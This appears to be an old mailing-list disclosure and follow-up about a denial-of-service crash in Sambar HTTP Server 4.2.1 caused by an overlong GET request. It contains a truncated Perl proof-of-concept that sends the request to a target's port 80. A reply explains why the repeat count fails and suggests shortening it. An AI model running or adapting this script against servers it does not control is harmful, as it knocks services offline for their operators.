While testing the security of the Sambar HTTP-Server I found it vulnerable
to a simple DOS attack. Sending a "GET XXXX(...a lot of Xs..)XXXX HTTP/1.0"
crashes the Server. It will die WITHOUT logging the attack.

My testing-environment:

Sambar 4.2.1
M$IE 5.0 (de)
Windows 95 C (de)

Sample exploit code follows.

        die "+ Please give the host address as argument\n"
}

opensocket ("\n");
print $remote "GET " . "X" x 99999999999999999999 . " HTTP/1.0\n\n";
close $remote;

opensocket ("\n+ The server seemed to be vulnerable to this attack\n");
close $remote;
die "+ The server does not seem to be vulnerable to this attack\n";

sub opensocket {
        $remote = IO::Socket::INET->new (
                Proto => "tcp",
                PeerAddr => $ARGV[0],
                PeerPort => "http(80)",
        ) || die "+ Can't open http-port on $ARGV[0]$_[0]";

Using that many 9s on my version of Perl fails silently. The above
seems equivalent to: print $remote "GET  HTTP/1.0\n\n";

steve@grok:/home/steve% perl -e 'print "X"x99999999999999999999;'
steve@grok:/home/steve% perl -e 'print "X"x99999999999999999999 || die;'
Died at -e line 1.
steve@grok:/home/steve% perl -v

This is perl, version 5.005_03 built for i386-freebsd
[etc.]

I don't have a Sambar HTTP server to test against but it seems clear
that the code won't work the way the author expected. Perl doesn't
even try to build a string that long. If it did it would run out of
memory and then fail.

I conclude that the script as posted will not DoS the server even if
it is vulnerable, unless a simple "GET  HTTP/1.0" triggers the DoS.

I suggest that until the nature of the DoS is clarified anyone using
the script to test their own server should try it as-is, then try it
with fewer 9s (probably 9999 or 99999, maybe more if it's a resource
exhaustion DoS).
